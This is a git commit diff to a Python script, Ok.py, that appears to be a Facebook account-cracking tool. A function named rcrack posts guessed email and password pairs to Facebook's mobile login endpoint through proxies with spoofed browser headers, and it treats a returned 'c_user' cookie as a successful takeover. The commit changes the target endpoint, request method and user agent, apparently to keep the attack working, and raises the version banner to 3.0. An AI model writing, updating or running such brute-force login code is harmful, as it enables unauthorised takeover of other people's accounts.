91afdbdc9f0edc3df2343d6d3dd840153d605413
MR-KINGX <128972681+MR-KINGX@users.noreply.github.com>
2023-05-26 05:21:19 +0500

    Add files via upload

--- Ok.py
+++ Ok.py
@@ -220,7 +220,7 @@ logo ="""\033[1;32m
 \033[1;32m[+] \033[1;34mON FACEBOK   :  \033[1;34mAB KHANX
 \033[1;32m[+] \033[1;35mON GITHUB    :  \033[1;35mMR-KINGX
 \033[1;32m[+] \033[1;36mTOOL STATUS  :  \033[1;36mFREE
-\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;36m2.0
+\033[1;32m[+] \033[1;36mTOOL VIRSION :  \033[1;36m3.0
 \033[1;32m[+]==============================================      """
 loop = 0
 oks = []
@@ -304,8 +304,8 @@ def rcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb = {'authority':'mbasic.facebook.com',
-            'method': 'GET',
+            header_freefb = {'authority':'p.facebook.com',
+            'method': 'POST',
             'scheme': 'https',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,fa-IR;q=0.6,fa;q=0.5',
@@ -321,8 +321,8 @@ def rcrack(uid,pwx,tl):
             'sec-fetch-site': 'none',
             'sec-fetch-user': '?1',
             'upgrade-insecure-requests': '1',
-            'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',}
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb,proxies=proxs).text
+            'user-agent': 'Opera/9.80 (Windows NT 6.0) Presto/2.12.388 Version/12.14',}
+            lo = session.post('https://p.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb,proxies=proxs).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
